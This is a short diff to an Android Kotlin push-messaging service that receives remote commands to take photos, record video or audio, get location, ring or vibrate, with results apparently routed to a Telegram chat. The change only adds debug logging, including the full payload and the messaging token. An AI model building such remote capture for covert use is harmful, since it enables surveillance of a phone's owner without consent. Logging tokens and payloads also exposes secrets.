@@ -7,6 +7,7 @@ import com.google.firebase.messaging.RemoteMessage
 class FCMService : FirebaseMessagingService() {
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
         Log.d("FCMService", "From: ${remoteMessage.from}")
+        Log.d("FCMService", "Data: ${remoteMessage.data}")
 
         val type = remoteMessage.data["type"]       // e.g. "photo", "video", "audio", "location", "ring", "vibrate"
         val camera = remoteMessage.data["camera"]   // e.g. "front" or "rear"
@@ -16,6 +17,10 @@ class FCMService : FirebaseMessagingService() {
         val chatId = remoteMessage.data["chat_id"]  // The Telegram user/chat id
 
         if (type != null && chatId != null) {
+            Log.d(
+                "FCMService",
+                "Dispatching action: type=$type, camera=$camera, flash=$flash, quality=$quality, duration=$duration, chatId=$chatId"
+            )
             ActionHandlers.dispatch(
                 applicationContext,
                 type = type,
@@ -26,12 +31,12 @@ class FCMService : FirebaseMessagingService() {
                 chatId = chatId
             )
         } else {
-            Log.d("FCMService", "Invalid or missing command data: $type $camera $flash $quality $duration $chatId")
+            Log.e("FCMService", "Invalid or missing command data: type=$type, chatId=$chatId")
         }
     }
 
     override fun onNewToken(token: String) {
         Log.d("FCMService", "Refreshed token: $token")
-        // You can send the new token to your bot server if needed
+        // Send the new token to your bot server if needed
     }
 }
